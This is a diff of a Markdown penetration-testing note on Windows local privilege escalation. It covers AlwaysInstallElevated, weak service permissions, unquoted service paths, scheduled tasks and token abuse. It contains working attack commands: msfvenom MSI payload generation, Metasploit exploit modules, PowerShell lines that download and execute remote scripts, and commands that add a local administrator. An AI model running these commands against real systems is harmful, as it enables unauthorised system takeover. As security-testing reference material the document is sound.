@@ -1,4 +1,4 @@
-# Windows - Local Privilege Escalation
+determine# Windows - Local Privilege Escalation
 
 The following note assumes that a low privilege shell could be obtained on the
 target.
@@ -359,7 +359,7 @@ the host:
 
 | DOS | Powershell | WMI |
 |-----|------------|-----|
-| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get Caption,Description,HotFixID,InstalledOn |
+| systeminfo<br/> Check content of C:\Windows\SoftwareDistribution\Download<br/>type C:\Windows\WindowsUpdate.log | Get-HotFix | wmic qfe get HotFixID,InstalledOn,Description |
 
 Automatically compare the system patch level to public known exploits:
 
@@ -458,6 +458,67 @@ pyinstaller --onefile <SCRIPT>.py
 
 `PyInstaller` should be used on a Windows operating system.
 
+### AlwaysInstallElevated policy
+
+Windows provides a mechanism which allows unprivileged user to install Windows
+installation packages, Microsoft Windows Installer Package (MSI) files,
+with NT AUTHORITY\SYSTEM privileges. This policy is known as
+`AlwaysInstallElevated`.
+
+If activated, this mechanism can be leveraged to elevate privileges on the
+system by executing code through the MSI during the installation process as
+NT AUTHORITY\SYSTEM.    
+
+The Windows built-in `req query` and the the `Powershell` `PowerUp` script can
+be used to check whether the `AlwaysInstallElevated` policy is deployed on the
+host be querying the registry:
+
+```
+# If "REG_DWORD 0x1" is returned the policy is activated
+# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Get-RegistryAlwaysInstallElevated
+
+meterpreter> load powershell
+meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
+meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
+```
+
+The policy can be abused through a `meterpreter` session using the `Metasploit`
+module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
+`msfvenom` or using the `Powershell` `PowerUp` script.
+
+Note that the `Metasploit` module
+`exploit/windows/local/always_install_elevated` will prevent the installation
+from succeeding to avoid the registration of the program on the system.  
+
+```
+# Requires a meterpreter session
+msf> use exploit/windows/local/always_install_elevated
+
+# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
+# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
+# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system
+
+msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
+msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>
+
+# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
+msiexec /quiet /qn /i <MSI_PATH>
+
+# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
+# Prompt a GUI interface to specify the user to be added
+PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
+erSploit/master/Privesc/PowerUp.ps1")
+PS> Write-UserAddMSI
+```
+
 ### Services misconfigurations
 
 In Windows NT operating systems, a Windows service is a computer program that
@@ -474,10 +535,12 @@ NT AUTHORITY\SYSTEM.
 
 ###### Services enumeration
 
-The Windows built-in `sc` can be used to enumerate the services configured on the
-target:
+The Windows built-ins `sc` and `wmic` can be used to enumerate the services configured on
+the target system:
 
 ```
+# List services
+wmic service list config
 sc query
 
 sc qc <SERVICENAME>
@@ -486,8 +549,8 @@ sc qc <SERVICENAME>
 ###### Weak services permissions
 
 A weak service permissions vulnerability occurs when an unprivileged user can
-alter the service configuration or the service binary so that the service runs a
-specified command or executable.  
+alter the service configuration so that the service runs a specified command or
+executable.  
 
 The `accesschk` tool, from the `Sysinternals` suite, and the `Powershell`
 `PowerUp` script can be used to list the services an user can exploit:
@@ -551,33 +614,48 @@ through an existing `meterpreter` session to automatically detect and exploit
 weak services permissions to execute a specified payload under NT
 AUTHORITY\SYSTEM privileges.
 
-###### Unquoted services path
+###### Unsecure NTFS permissions on service binaries
+
+Permissive NTFS permissions on the service binary used by the service can be
+leveraged to elevate privileges on the system as the user running the service.
+
+The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
+the services binary:
+
+```
+icacls <BINARY_PATH>
+```
+
+###### Unquoted service binary paths
 
 When a service path is unquoted, the Service Manager will try to find the
 service binary in the shortest path, moving up to the longest path until one
 works.     
-For example, for the path C:\Service Folder\Service_binary.exe, the space
+For example, for the path C:\TEST\Service Folder\binary.exe, the space
 is treated as an optional path to explore for that service. The resolution
-process will first look into C:\ for the Service.exe binary and, if it
+process will first look into C:\TEST\ for the Service.exe binary and, if it
 exist, use it to start the service.  
 
 Here is Windows’ chain of thought for the above example:
 
 1. Are they asking me to run  
-   "C:\Service.exe" Folder\Service_binary.exe  
+   "C:\TEST\Service.exe" Folder\binary.exe  
    No, it does not exist.
 
 2. Are they asking me to run  
-   "C:\Service Folder\Service_binary.exe"  
+   "C:\TEST\Service Folder\Service_binary.exe"  
    Yes, it does exist.
 
 In summary, a service is vulnerable if the path to the executable contains
-spaces and the path is not wrapped in quote marks ; exploitation
-requires write permissions to the path before the quote mark.
+spaces and is not wrapped in quote marks. Exploitation requires write
+permissions to the path before the quote mark. Note that unquoted path
+for services in `C:\Program Files` and `C:\Program Files (x86)` are usually
+not exploitable as unprivileged user rarely have write access in the `C:\` root
+directory or in the standard program directories.
 
-In the example, if an attacker has write privilege in C:\, he could create a
-C:\Service.exe and escalate its privileges to the level of the account that
-starts the service.  
+In the above example, if an attacker has write privilege in C:\TEST\, he could create
+a C:\Service.exe and escalate its privileges to the level of the account that
+starts the service.
 
 To find vulnerable services the `wmic` tool and the `Powershell` `PowerUp`
 script can be used as well as a manual review of each service metadata using
@@ -602,10 +680,10 @@ meterpreter> powershell_execute Get-ServiceUnquoted
 
 The `Metasploit` module `exploit/windows/local/trusted_service_path` can be used
 through an existing `meterpreter` session to automatically detect and exploit
-weak services permissions to execute a specified payload under NT
-AUTHORITY\SYSTEM privileges.
+unquoted service path to execute a specified payload under `NT AUTHORITY\SYSTEM`
+privileges.
 
-###### misc
+###### Misc
 
 *Add a local administrator user*
 
@@ -651,66 +729,55 @@ start."), the dependencies can be removed to fix the service:
 sc config <SERVICE_NAME> depend= ""
 ```
 
-### AlwaysInstallElevated policy
+### Scheduled tasks
 
-Windows provides a mechanism which allows unprivileged user to install Windows
-installation packages, Microsoft Windows Installer Package (MSI) files,
-with NT AUTHORITY\SYSTEM privileges. This policy is known as
-`AlwaysInstallElevated`.
+Scheduled tasks are used to automatically perform a routine task on the system
+whenever the criteria associated to the scheduled task occurs. The scheduled
+tasks can either be run at a defined time, on repeat at set intervals, or
+when a specific event occurs, such as the system boot.
 
-If activated, this mechanism can be leveraged to elevate privileges on the
-system by executing code through the MSI during the installation process as
-NT AUTHORITY\SYSTEM.    
+The scheduled tasks are exposed to the same kinds of misconfigurations flaws
+affecting the Windows services. However, note that the Windows GUI utility `Task
+Scheduler`, used to configure scheduled task, will always make use of quoted
+binary path, thus limiting the occurrence of unquoted scheduled task path.
 
-The Windows built-in `req query` and the the `Powershell` `PowerUp` script can
-be used to check whether the `AlwaysInstallElevated` policy is deployed on the
-host be querying the registry:
-
-```
-# If "REG_DWORD 0x1" is returned the policy is activated
-# If not, the error message "ERROR: The system was unable to find the specified registry key or value." indicates that the policy is not set
-
-reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
-
-# (PowerShell) PowerSploit's PowerUp Get-RegistryAlwaysInstallElevated
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
-PS> Get-RegistryAlwaysInstallElevated
-
-meterpreter> load powershell
-meterpreter> powershell_import <POWERUP_PS1_FILE_PATH>
-meterpreter> powershell_execute Get-RegistryAlwaysInstallElevated
-```
-
-The policy can be abused through a `meterpreter` session using the `Metasploit`
-module `exploit/windows/local/always_install_elevated`, by crafting a MSI with
-`msfvenom` or using the `Powershell` `PowerUp` script.
-
-Note that the `Metasploit` module
-`exploit/windows/local/always_install_elevated` will prevent the installation
-from succeeding to avoid the registration of the program on the system.  
+The Windows built-in `schtasks` can be used to enumerate the scheduled tasks
+configured on the system or to retrieve information about a specific scheduled
+task.
 
 ```
-# Requires a meterpreter session
-msf> use exploit/windows/local/always_install_elevated
+# List all configured scheduled tasks - verbose
+schtasks /query /fo LIST /v
 
-# msfvenom can be used to generate a MSI starting a Metasploit payload or using a provided binary  
-# Refer to the "[General] Shells" note for generating binaries that can bypass anti-virus detection
-# Refer to the "[General] File transfer" note for file transfer techniques to upload the MSI on the targeted system
-
-msfvenom -p <PAYLOAD> -f msi-nouac > <MSI_FILE>
-msfvenom -p windows/exec cmd="<BINARY_PATH>" -f msi-nouac > <MSI_FILE>
-
-# /quiet: no messages displayed, /qn: no GUI, /i runs as current user
-msiexec /quiet /qn /i <MSI_PATH>
-
-# (PowerShell) PowerSploit's PowerUp Write-UserAddMSI
-# Prompt a GUI interface to specify the user to be added
-PS> IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/Pow
-erSploit/master/Privesc/PowerUp.ps1")
-PS> Write-UserAddMSI
+# Query the specified scheduled task
+schtasks /v /query /fo LIST  /tn <TASK_NAME>
 ```
+
+The commands below can be chained to filter the enabled scheduled tasks name and
+action for `NT AUTHORITY\SYSTEM`, `Administrator` or the specified user:   
+
+```
+# Windows
+schtasks /query /fo LIST /v > <TASKS_LIST_FILE>
+
+# Linux
+grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 "NT AUTHORITY\\\SYSTEM\|Administrator"
+grep "TaskName\|Task To Run\|Run As User\|Scheduled Task State" <TASKS_LIST_FILE> | grep -B2 -A 1 "Enabled" | grep -B 3 <USERNAME>
+```
+
+The Windows bullet-in `icacls` can be used to determine the NTFS permissions on
+the scheduled tasks binary:
+
+```
+icacls <BINARY_PATH>
+```
+
+If the current user can modify the binary / script of a scheduled task run by
+another user, arbitrary command execution under the other user privileges can
+be achieved once the criteria associated to the scheduled task occurs.
+
+Refer to the `[General] Shells - Binary` note for reverse shell binaries /
+scripts.  
 
 ### Token Privileges abuse
 
@@ -781,10 +848,24 @@ Invoke-Tater -Command "net user <USERNAME> <PASSWORD> /add && net localgroup adm
 powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<WEBSERVER_IP>:<WEBSERVER_PORT>/Tater.ps1'); Invoke-Tater -Command <POWERSHELLCMD>;
 ```
 
+### Windows Subsystem for Linux (WSL)
+
+Windows Subsystem for Linux
+Introduced in Windows 10
+Lets you execute Linux binaries natively on Windows
+
+###### File system
+
+###### Backdoor
+
+*bashrc*
+
+*Planified tasks*
+
 ### Credentials re-use
 
-To use another user credentials, `psexec` can be used to start a CMD shell or
-start a reverse shell:
+The Windows utility `psexec` can be used to start a CMD shell or start a
+reverse shell as another user:
 
 ```
 # Use the -s option if the user provided is member of the administrators group
@@ -816,25 +897,6 @@ psexec.exe -accepteula -s -i -d cmd.exe
 
 If a `meterpreter` shell is being used, the `getsystem` command can be
 leveraged to the same end.
-
-### Scheduled tasks
-
-### Windows Subsystem for Linux (WSL)
-
-Windows Subsystem for Linux
-Introduced in Windows 10
-Lets you execute Linux binaries natively on Windows
-
-###### File system
-
-###### Backdoor
-
-*bashrc*
-
-*Planified tasks*
-
-
-
 
 ### TODO
 
